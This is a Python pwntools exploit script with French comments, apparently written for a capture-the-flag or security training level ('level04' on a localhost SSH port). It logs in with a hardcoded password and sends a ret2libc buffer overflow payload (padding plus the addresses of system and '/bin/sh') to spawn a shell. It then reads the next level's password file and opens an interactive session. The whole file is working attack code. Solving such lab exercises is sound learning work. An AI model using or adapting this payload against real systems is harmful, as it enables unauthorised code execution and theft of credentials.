#!/usr/bin/env python3
from pwn import *
import base64
import os


# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8881  # Port pour SSH
USER = "level04"  # Nom d'utilisateur SSH
PASSWORD = "kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf"  # Mot de passe SSH
SSH_SESSION = None


def get_connection(custom_env=None, argv=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        final_argv = argv if argv is not None else ['./Resources/' + USER]
        return process(final_argv, env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)

        # Fusionner avec nos variables personnalisées 
        final_env = merge_env(remote_env_dict, custom_env)
        final_argv = argv if argv is not None else ['/home/users/' + USER + '/' + USER]
        log.info(f"Final argv: {final_argv}")
        return shell.process(final_argv, env=final_env)


def exploit():

    address_system = 0xf7e6aed0
    address_return = 0xf7e5eb70
    address_bin_sh = 0xf7f897ec
    payload = b"A" * 156 + p32(address_system) + p32(address_return) + p32(address_bin_sh)

    conn = get_connection()

    if LOCAL:
        gdb.attach(conn, '''
          break *main
          continue
          ''')

    print(conn.recvuntil(b'Give me some shellcode, k\n'))
    conn.sendline(payload)
    print(payload)



    try:
        if not LOCAL:
            conn.recvuntil(b'$')
            conn.sendline('cat /home/users/level05/.pass')
            flag = conn.recvline()
            print("\n=== Flag ===")
            print(flag.decode())
            conn.interactive()

        # conn.interactive()

    except EOFError:
        print("EOFError")
        pass
    except Exception as e:
        print(e)
        pass
    finally:
        conn.close()

   
if __name__ == "__main__":
    exploit()




